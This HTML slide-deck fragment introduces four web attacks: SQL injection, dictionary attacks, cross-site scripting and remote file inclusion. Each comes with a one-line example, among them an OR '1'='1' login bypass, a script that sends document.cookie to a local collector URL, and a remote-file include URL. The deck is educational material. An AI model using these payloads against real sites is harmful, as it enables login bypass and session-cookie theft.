<div class="section" id="section1">
	<!-- First slide deals with SQL Injection -->
	<div class="slide slide01 slides">
		<div class="slide-sql">
			<h1>SQL Injections</h1>
			<p>SQL injection is a code injection technique, used to attack data-driven applications, in which nefarious SQL statements are inserted into an entry field for execution.</p>
			<pre>Example : SELECT * FROM users WHERE login = 'blabla' OR '1'='1' -- AND pass = ?</pre>
		</div>

	</div>
	<!-- Second slide deals with Dictionary Attack -->
	<div class="slide slide02 slides">
		<div class="slide-dictionary">
			<h1>Dictionary Attack</h1>
			<p>In cryptanalysis and computer security, a dictionary attack is a technique for defeating a cipher or authentication mechanism by trying to determine its decryption key or passphrase by trying hundreds or sometimes millions of likely possibilities, such as words in a dictionary.</p>
			<pre>Example : English Dictionary with 263 533 words</pre>
		</div>
	</div>
	<!-- Third slide deals with XSS attack -->
	<div class="slide slide03 slides">
		<div class="slide-xss">
			<h1>Cross-site Scripting XSS</h1>
			<p>XSS enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy</p>
			<pre>Example : window.location="http://127.0.0.1/securitytesting/xssattack/xss.php?c="+document.cookie;</pre>
		</div>
	</div>
	<!-- Fourth slide deals with Remote File Inlclusion Attack -->
	<div class="slide slide04 slides">
		<div class="slide-include">
			<h1>Remote File Inclusion Attack</h1>
			<p>This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time</p>
			<pre>Example : window.location = "http://127.0.0.1/securitytesting/?file=www.monSite.fr/"</pre>
		</div>
	</div>
</div>
</div>